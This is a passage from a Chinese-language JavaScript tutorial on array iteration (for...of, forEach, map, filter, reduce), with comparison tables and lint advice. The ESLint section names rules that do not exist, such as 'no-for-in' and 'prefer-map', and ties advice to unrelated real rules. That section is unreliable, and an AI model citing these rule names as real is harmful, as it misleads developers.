<span class="hljs-comment">// 输出: Index 0: 1; Index 1: 2; ...; Index 4: 5</span>

<span class="hljs-comment">// 遍历字符串</span>
<span class="hljs-keyword">const</span> str = <span class="hljs-string">'hello'</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> char <span class="hljs-keyword">of</span> str) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(char);
}
<span class="hljs-comment">// 输出: h, e, l, l, o</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>直接遍历元素</strong>：无需手动管理索引，直接访问元素值，代码更简洁。</li>
<li><strong>支持可迭代对象</strong>：除数组外，还支持遍历字符串、Map、Set、Generator 等可迭代对象。</li>
<li><strong>可中断循环</strong>：支持 break、continue、return 等控制语句，可提前终止循环。</li>
<li><strong>不遍历非数字属性</strong>：与 for...in 不同，for...of 仅遍历数组的数字索引属性，不会遍历非数字属性（如数组的自定义属性）。</li>
<li><strong>不支持修改数组长度</strong>：在循环中修改数组长度可能导致遍历不完整或重复遍历（建议避免）。</li>
</ul>
<h4 data-id="heading-14">forEach () 方法</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript">array.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// 处理逻辑</span>
}, [thisArg]);
</code></pre>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>currentValue</code>：当前遍历的元素。</li>
<li><code>index</code>（可选）：当前元素的索引。</li>
<li><code>array</code>（可选）：被遍历的原数组。</li>
<li><code>thisArg</code>（可选）：回调函数中 this 的指向对象。</li>
</ul>
<p><strong>用法</strong>：forEach () 方法对数组中的每个元素执行一次回调函数，无返回值，仅用于遍历执行操作。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// 基础用法</span>
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num);
});
<span class="hljs-comment">// 输出: 1, 2, 3, 4, 5</span>

<span class="hljs-comment">// 带索引参数</span>
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">num, index</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Index <span class="hljs-subst">${index}</span>: Value <span class="hljs-subst">${num}</span>`</span>);
});
<span class="hljs-comment">// 输出: Index 0: Value 1; Index 1: Value 2; ...; Index 4: Value 5</span>

<span class="hljs-comment">// 使用thisArg参数</span>
<span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">multiplier</span>: <span class="hljs-number">2</span> };
numbers.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num * <span class="hljs-variable language_">this</span>.<span class="hljs-property">multiplier</span>); <span class="hljs-comment">// this指向obj</span>
}, obj);
<span class="hljs-comment">// 输出: 2, 4, 6, 8, 10</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li>
<p><strong>无返回值</strong>：forEach () 不返回新数组，仅执行操作（若需返回结果，应使用 map、filter 等方法）。</p>
</li>
<li>
<p><strong>无法中断循环</strong>：不支持 break 和 continue，无法提前终止循环（即使抛出异常也不推荐）。</p>
</li>
<li>
<p><strong>回调函数特性</strong>：</p>
<ul>
<li>若使用普通函数作为回调，this 值由 thisArg 参数指定；</li>
<li>若使用箭头函数，thisArg 参数无效，this 指向外层作用域的 this。</li>
</ul>
</li>
<li>
<p><strong>不改变原数组</strong>：forEach () 本身不会修改原数组，但若在回调函数中显式修改元素（如<code>array[index] = num * 2</code>），则会改变原数组。</p>
</li>
<li>
<p><strong>ESLint 警告</strong>：某些 ESLint 配置（如<code>no-foreach</code>）会警告使用 forEach，因为它可能隐藏副作用（建议优先使用函数式方法）。</p>
</li>
</ul>
<h4 data-id="heading-15">map () 方法</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> newArray = array.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// 处理逻辑，返回新值</span>
}, [thisArg]);
</code></pre>
<p><strong>用法</strong>：map () 方法对数组中的每个元素执行回调函数，将回调函数的返回值组成新数组返回，原数组保持不变。适用于数组元素的转换操作。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// 基础转换（数值翻倍）</span>
<span class="hljs-keyword">const</span> doubled = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(doubled); <span class="hljs-comment">// 输出: [2, 4, 6, 8, 10]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(numbers); <span class="hljs-comment">// 原数组不变: [1, 2, 3, 4, 5]</span>

<span class="hljs-comment">// 转换为对象数组</span>
<span class="hljs-keyword">const</span> objects = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">num, index</span>) =&gt;</span> ({
  <span class="hljs-attr">id</span>: index,
  <span class="hljs-attr">value</span>: num,
  <span class="hljs-attr">squared</span>: num * num
}));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(objects);
<span class="hljs-comment">// 输出: [</span>
<span class="hljs-comment">//   { id: 0, value: 1, squared: 1 },</span>
<span class="hljs-comment">//   { id: 1, value: 2, squared: 4 },</span>
<span class="hljs-comment">//   ...</span>
<span class="hljs-comment">// ]</span>

<span class="hljs-comment">// 字符串处理</span>
<span class="hljs-keyword">const</span> names = [<span class="hljs-string">'alice'</span>, <span class="hljs-string">'bob'</span>, <span class="hljs-string">'charlie'</span>];
<span class="hljs-keyword">const</span> capitalized = names.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> name.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toUpperCase</span>() + name.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(capitalized); <span class="hljs-comment">// 输出: ['Alice', 'Bob', 'Charlie']</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li>
<p><strong>返回新数组</strong>：始终返回与原数组长度相同的新数组（即使回调函数返回 undefined），原数组不变。</p>
</li>
<li>
<p><strong>不可中断循环</strong>：不支持 break 和 continue，必须遍历完所有元素。</p>
</li>
<li>
<p><strong>函数式编程</strong>：鼓励使用无副作用的纯函数（回调函数不修改外部变量或原数组）。</p>
</li>
<li>
<p><strong>性能考量</strong>：创建新数组可能带来额外内存开销，对于大型数组（百万级元素）需谨慎使用。</p>
</li>
<li>
<p><strong>常见错误</strong>：</p>
<ul>
<li>忘记返回值：回调函数未返回值时，新数组元素为 undefined；</li>
<li>误用索引：将 index 作为元素值使用（如<code>map(index =&gt; index * 2)</code>）；</li>
<li>副作用操作：在回调函数中修改外部变量或原数组（违反纯函数原则）。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-16">filter () 方法</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> newArray = array.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// 返回布尔值，决定元素是否保留</span>
}, [thisArg]);
</code></pre>
<p><strong>用法</strong>：filter () 方法通过回调函数（布尔函数）过滤数组元素，返回由满足条件（回调函数返回 true）的元素组成的新数组，原数组保持不变。适用于数组元素的筛选操作。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>];

<span class="hljs-comment">// 筛选偶数</span>
<span class="hljs-keyword">const</span> evenNumbers = numbers.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(evenNumbers); <span class="hljs-comment">// 输出: [2, 4, 6]</span>

<span class="hljs-comment">// 筛选长度&gt;=5的字符串</span>
<span class="hljs-keyword">const</span> words = [<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'kiwi'</span>, <span class="hljs-string">'grape'</span>, <span class="hljs-string">'orange'</span>];
<span class="hljs-keyword">const</span> longWords = words.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">word</span> =&gt;</span> word.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">5</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(longWords); <span class="hljs-comment">// 输出: ['apple', 'banana', 'orange']</span>

<span class="hljs-comment">// 筛选对象数组（年龄&gt;=25）</span>
<span class="hljs-keyword">const</span> people = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }
];
<span class="hljs-keyword">const</span> adults = people.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">person</span> =&gt;</span> person.<span class="hljs-property">age</span> &gt;= <span class="hljs-number">25</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(adults); <span class="hljs-comment">// 输出: [{ name: 'Alice', age: 25 }, { name: 'Bob', age: 30 }]</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li><strong>返回新数组</strong>：返回的新数组长度可能小于或等于原数组（取决于满足条件的元素数量），原数组不变。</li>
<li><strong>不可中断循环</strong>：不支持 break 和 continue，必须遍历完所有元素。</li>
<li><strong>布尔返回值</strong>：回调函数必须返回布尔值（true/false），非布尔值会被自动转换（如 0→false、非 0→true）。</li>
<li><strong>函数式编程</strong>：鼓励使用无副作用的纯函数，回调函数不应修改外部变量或原数组。</li>
<li><strong>性能考量</strong>：创建新数组可能带来额外内存开销，对于大型数组需结合实际场景优化。</li>
</ul>
<h4 data-id="heading-17">reduce () 方法</h4>
<p><strong>语法</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> result = array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">accumulator, currentValue, [index], [array]</span>) =&gt;</span> {
  <span class="hljs-comment">// 累积逻辑，返回新的累积值</span>
}, [initialValue]);
</code></pre>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>accumulator</code>：累加器，存储上一次回调函数的返回值（初始值为 initialValue 或数组第一个元素）。</li>
<li><code>currentValue</code>：当前遍历的元素。</li>
<li><code>index</code>（可选）：当前元素的索引。</li>
<li><code>array</code>（可选）：被遍历的原数组。</li>
<li><code>initialValue</code>（可选）：累加器的初始值，若未提供则使用数组第一个元素作为初始值，且从第二个元素开始遍历。</li>
</ul>
<p><strong>用法</strong>：reduce () 方法对数组中的每个元素执行回调函数，将其结果汇总为单个值返回（如求和、求积、对象聚合等），功能强大且灵活。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// 1. 求和（提供初始值）</span>
<span class="hljs-keyword">const</span> sum = numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sum); <span class="hljs-comment">// 输出: 15</span>

<span class="hljs-comment">// 2. 求积（未提供初始值）</span>
<span class="hljs-keyword">const</span> product = numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc * num);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product); <span class="hljs-comment">// 输出: 120（1*2*3*4*5）</span>

<span class="hljs-comment">// 3. 聚合对象（统计年龄总和）</span>
<span class="hljs-keyword">const</span> people = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Charlie'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> }
];
<span class="hljs-keyword">const</span> ageSum = people.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, person</span>) =&gt;</span> acc + person.<span class="hljs-property">age</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ageSum); <span class="hljs-comment">// 输出: 75</span>

<span class="hljs-comment">// 4. 分组统计（按年龄分组）</span>
<span class="hljs-keyword">const</span> ageGroups = people.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, person</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> key = person.<span class="hljs-property">age</span> &gt;= <span class="hljs-number">25</span> ? <span class="hljs-string">'adults'</span> : <span class="hljs-string">'youngsters'</span>;
  acc[key] = acc[key] ? [...acc[key], person] : [person];
  <span class="hljs-keyword">return</span> acc;
}, {});
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ageGroups);
<span class="hljs-comment">// 输出: {</span>
<span class="hljs-comment">//   adults: [{ name: 'Alice', age: 25 }, { name: 'Bob', age: 30 }],</span>
<span class="hljs-comment">//   youngsters: [{ name: 'Charlie', age: 20 }]</span>
<span class="hljs-comment">// }</span>

<span class="hljs-comment">// 5. 数组扁平化（二维数组转一维）</span>
<span class="hljs-keyword">const</span> nestedArray = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>]];
<span class="hljs-keyword">const</span> flattened = nestedArray.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, arr</span>) =&gt;</span> [...acc, ...arr], []);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flattened); <span class="hljs-comment">// 输出: [1, 2, 3, 4, 5, 6]</span>
</code></pre>
<p><strong>注意事项</strong>：</p>
<ul>
<li>
<p><strong>返回单个值</strong>：最终返回一个汇总值（可以是数字、对象、数组等），而非数组。</p>
</li>
<li>
<p><strong>初始值影响</strong>：</p>
<ul>
<li>提供初始值：累加器从初始值开始，遍历所有元素；</li>
<li>未提供初始值：累加器从数组第一个元素开始，遍历从第二个元素开始；</li>
<li>空数组无初始值：会抛出 TypeError（必须提供初始值）。</li>
</ul>
</li>
<li>
<p><strong>不可中断循环</strong>：不支持 break 和 continue，必须遍历完所有元素。</p>
</li>
<li>
<p><strong>函数式编程</strong>：鼓励使用无副作用的纯函数，每次迭代应返回新的累加器（而非修改原累加器），确保可预测性。</p>
</li>
<li>
<p><strong>性能考量</strong>：在大型数组中可能性能略低，但通常与 forEach、map 等方法差异不大，且功能更强大。</p>
</li>
</ul>
<h3 data-id="heading-18">遍历方法对比与选择指南</h3>
<h4 data-id="heading-19">对象遍历方法对比</h4>





































































<table><thead><tr><th>方法</th><th>遍历继承属性</th><th>处理 Symbol 键</th><th>返回值类型</th><th>性能</th><th>适用场景</th></tr></thead><tbody><tr><td>for...in</td><td>是</td><td>否</td><td>属性名字符串（逐个返回）</td><td>中等</td><td>遍历对象所有可枚举属性（包括继承），调试场景</td></tr><tr><td>Object.keys()</td><td>否</td><td>否</td><td>可枚举自有属性名数组</td><td>高</td><td>遍历对象自身可枚举属性名</td></tr><tr><td>Object.values()</td><td>否</td><td>否</td><td>可枚举自有属性值数组</td><td>高</td><td>遍历对象自身可枚举属性值</td></tr><tr><td>Object.entries()</td><td>否</td><td>否</td><td>可枚举自有属性键值对数组</td><td>中等</td><td>同时遍历对象自身可枚举属性的键和值</td></tr><tr><td>Reflect.ownKeys()</td><td>否</td><td>是</td><td>所有自有属性键数组</td><td>中等</td><td>遍历对象所有自有属性（包括不可枚举、Symbol）</td></tr><tr><td>Object.getOwnPropertyNames()</td><td>否</td><td>否</td><td>所有自有属性名数组</td><td>中等</td><td>遍历对象所有自有属性名（包括不可枚举）</td></tr><tr><td>Object.getOwnPropertySymbols()</td><td>否</td><td>是</td><td>所有自有 Symbol 属性名数组</td><td>中等</td><td>遍历对象所有自有 Symbol 属性名</td></tr></tbody></table>
<h4 data-id="heading-20">数组遍历方法对比</h4>





























































<table><thead><tr><th>方法</th><th>返回值类型</th><th>可中断循环</th><th>性能</th><th>函数式特性</th><th>适用场景</th></tr></thead><tbody><tr><td>传统 for 循环</td><td>无</td><td>是</td><td>高</td><td>无</td><td>需要精确控制索引、修改数组、中断循环</td></tr><tr><td>for...of</td><td>无</td><td>是</td><td>中等</td><td>有</td><td>遍历可迭代对象（数组、字符串等），无需索引</td></tr><tr><td>forEach()</td><td>无</td><td>否</td><td>中等</td><td>有</td><td>遍历数组执行操作，无需返回结果</td></tr><tr><td>map()</td><td>新数组（转换后）</td><td>否</td><td>中等</td><td>有</td><td>数组元素转换，生成新数组</td></tr><tr><td>filter()</td><td>新数组（筛选后）</td><td>否</td><td>中等</td><td>有</td><td>数组元素筛选，生成新数组</td></tr><tr><td>reduce()</td><td>单个汇总值</td><td>否</td><td>中等</td><td>有</td><td>数组元素累积计算（求和、分组、扁平化等）</td></tr></tbody></table>
<h4 data-id="heading-21">适用场景选择建议</h4>
<h5 data-id="heading-22">1. 对象遍历场景</h5>
<ul>
<li>
<p><strong>调试对象属性</strong>：使用<code>for...in</code>（快速查看所有可枚举属性，包括继承）。</p>
</li>
<li>
<p><strong>安全遍历自身可枚举属性</strong>：</p>
<ul>
<li>仅需键名：<code>Object.keys()</code> + for...of/forEach；</li>
<li>仅需值：<code>Object.values()</code> + for...of/forEach；</li>
<li>需键值对：<code>Object.entries()</code> + for...of/forEach（ESLint 推荐）。</li>
</ul>
</li>
<li>
<p><strong>遍历所有自有属性（包括不可枚举）</strong> ：<code>Reflect.ownKeys()</code> 或 <code>Object.getOwnPropertyNames()</code>。</p>
</li>
<li>
<p><strong>处理 Symbol 类型属性</strong>：<code>Reflect.ownKeys()</code> 或 <code>Object.getOwnPropertySymbols()</code>。</p>
</li>
<li>
<p><strong>避免继承属性干扰</strong>：坚决避免使用<code>for...in</code>，优先使用<code>Object.keys()</code>/values()/entries()。</p>
</li>
</ul>
<h5 data-id="heading-23">2. 数组遍历场景</h5>
<ul>
<li>
<p><strong>需要索引或修改数组</strong>：使用传统 for 循环（性能最佳，控制灵活）。</p>
</li>
<li>
<p><strong>仅需遍历元素执行操作</strong>：</p>
<ul>
<li>无需中断循环：<code>forEach()</code>（代码简洁）；</li>
<li>可能需要中断循环：<code>for...of</code>（支持 break/continue）。</li>
</ul>
</li>
<li>
<p><strong>转换元素生成新数组</strong>：<code>map()</code>（一对一转换，保持长度不变）。</p>
</li>
<li>
<p><strong>筛选元素生成新数组</strong>：<code>filter()</code>（按条件筛选，长度可能变化）。</p>
</li>
<li>
<p><strong>累积计算（求和、分组等）</strong> ：<code>reduce()</code>（功能强大，支持复杂聚合）。</p>
</li>
<li>
<p><strong>遍历可迭代对象（字符串、Map 等）</strong> ：<code>for...of</code>（通用遍历方案）。</p>
</li>
</ul>
<h5 data-id="heading-24">3. 函数式编程场景</h5>
<ul>
<li>优先使用<code>map</code>、<code>filter</code>、<code>reduce</code>等高阶函数，代码更简洁、声明式，可维护性更高。</li>
<li>鼓励使用纯函数（无副作用），避免在回调函数中修改外部变量或原数组。</li>
<li>复杂逻辑可组合使用高阶函数（如<code>map().filter().reduce()</code>），替代多层 for 循环。</li>
</ul>
<h3 data-id="heading-25">ESLint 规范与最佳实践</h3>
<h4 data-id="heading-26">ESLint 对遍历方法的建议</h4>
<p>ESLint 作为前端常用的代码检查工具，对遍历方法有明确的规范建议，旨在提高代码质量和一致性：</p>
<ol>
<li>
<p><strong>禁止使用 for...in 遍历数组</strong>（规则：<code>no-for-in</code>）</p>
<ul>
<li>原因：for...in 会遍历数组的非数字属性（如自定义属性、原型链属性），导致意外结果。</li>
<li>解决方案：使用<code>for...of</code>、<code>forEach</code>、传统 for 循环或<code>Object.keys()</code>替代。</li>
</ul>
</li>
<li>
<p><strong>优先使用安全的对象遍历方法</strong>（规则：<code>prefer-object-spread</code>、<code>prefer-destructuring</code>）</p>
<ul>
<li>
<p>原因：<code>for...in</code>可能遍历继承属性，存在安全风险。</p>
</li>
<li>
<p>解决方案：使用<code>Object.keys()</code>/<code>values()</code>/<code>entries()</code>结合解构赋值，如：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 推荐</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(obj)) {
  <span class="hljs-comment">// 处理逻辑</span>
}

<span class="hljs-comment">// 不推荐</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) {
  <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-comment">// 处理逻辑</span>
  }
}
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>禁止在循环中修改数组</strong>（规则：<code>no-unsafe-optional-chaining</code>、<code>no-param-reassign</code>）</p>
<ul>
<li>原因：在<code>forEach</code>、<code>for...of</code>等循环中修改数组长度或元素，可能导致遍历不完整或重复遍历。</li>
<li>解决方案：使用<code>map</code>、<code>filter</code>等高阶函数创建新数组，而非修改原数组。</li>
</ul>
</li>
<li>
<p><strong>优先使用函数式方法替代 forEach</strong>（规则：<code>prefer-map</code>、<code>prefer-filter</code>、<code>prefer-reduce</code>）</p>
<ul>
<li>
<p>原因：<code>forEach</code>可能隐藏副作用，且无法返回结果，函数式方法更具表达力。</p>
</li>
<li>
<p>解决方案：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不推荐</span>
<span class="hljs-keyword">const</span> result = [];
arr.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>) {
    result.<span class="hljs-title function_">push</span>(num * <span class="hljs-number">2</span>);
  }
});

<span class="hljs-comment">// 推荐</span>
<span class="hljs-keyword">const</span> result = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>);
</code></pre>
</li>
</ul>
</li>
</ol>
<h4 data-id="heading-27">函数式编程最佳实践</h4>
<ol>
<li>
<p><strong>使用纯函数</strong></p>
<ul>
<li>
<p>回调函数不应修改外部变量或原数组，仅依赖输入参数返回结果。</p>
</li>
<li>
<p>示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 纯函数（推荐）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">double</span> = num =&gt; num * <span class="hljs-number">2</span>;
<span class="hljs-keyword">const</span> doubled = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">map</span>(double);

<span class="hljs-comment">// 非纯函数（不推荐）</span>
<span class="hljs-keyword">let</span> total = <span class="hljs-number">0</span>;
[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
  total += num; <span class="hljs-comment">// 修改外部变量</span>
});
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>避免回调地狱</strong></p>
<ul>
<li>
<p>多层<code>forEach</code>嵌套会降低代码可读性，可使用<code>map</code>、<code>filter</code>、<code>reduce</code>组合替代。</p>
</li>
<li>
<p>示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不推荐（嵌套forEach）</span>
<span class="hljs-keyword">const</span> data = [
  { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">items</span>: [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>] },
  { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">items</span>: [<span class="hljs-number">30</span>, <span class="hljs-number">40</span>] }
];
<span class="hljs-keyword">const</span> result = [];
data.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
  item.<span class="hljs-property">items</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> {
    result.<span class="hljs-title function_">push</span>(num * <span class="hljs-number">2</span>);
  });
});

<span class="hljs-comment">// 推荐（reduce + map）</span>
<span class="hljs-keyword">const</span> result = data.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, item</span>) =&gt;</span> {
  <span class="hljs-keyword">return</span> [...acc, ...item.<span class="hljs-property">items</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">num</span> =&gt;</span> num * <span class="hljs-number">2</span>)];
}, []);
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>合理使用解构赋值</strong></p>
<ul>
<li>
<p>遍历对象键值对时，使用解构赋值简化代码。</p>
</li>
<li>
<p>示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(obj).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${value}</span>`</span>);
});
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>处理边界情况</strong></p>
<ul>
<li>
<p>数组为空时，<code>reduce</code>必须提供初始值，避免抛出错误。</p>
</li>
<li>
<p>示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 推荐（提供初始值）</span>
<span class="hljs-keyword">const</span> sum = [].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num, <span class="hljs-number">0</span>); <span class="hljs-comment">// 0</span>

<span class="hljs-comment">// 不推荐（无初始值，空数组会报错）</span>
<span class="hljs-keyword">const</span> sum = [].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, num</span>) =&gt;</span> acc + num); <span class="hljs-comment">// TypeError</span>
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>性能优化</strong></p>
<ul>
<li>大型数组（百万级元素）遍历优先使用传统 for 循环（减少函数调用开销）。</li>
<li>避免在回调函数中执行复杂操作，可提前提取逻辑或缓存中间结果。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-28">常见问题与解决方案</h3>
<h4 data-id="heading-29">1. for...in 遍历数组时的问题</h4>
<p><strong>问题</strong>：使用 for...in 遍历数组时，会遍历到数组的非数字属性（如自定义属性、原型链属性），导致意外结果。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr.<span class="hljs-property">test</span> = <span class="hljs-string">'value'</span>; <span class="hljs-comment">// 添加非数字属性</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">gender</span> = <span class="hljs-string">'female'</span>; <span class="hljs-comment">// 原型链添加属性</span>

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> arr) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 输出: 0, 1, 2, 'test', 'gender'</span>
}
</code></pre>
<p><strong>解决方案</strong>：</p>
<ul>
<li>
<p>使用<code>for...of</code>遍历数组（仅遍历数字索引属性）：</p>
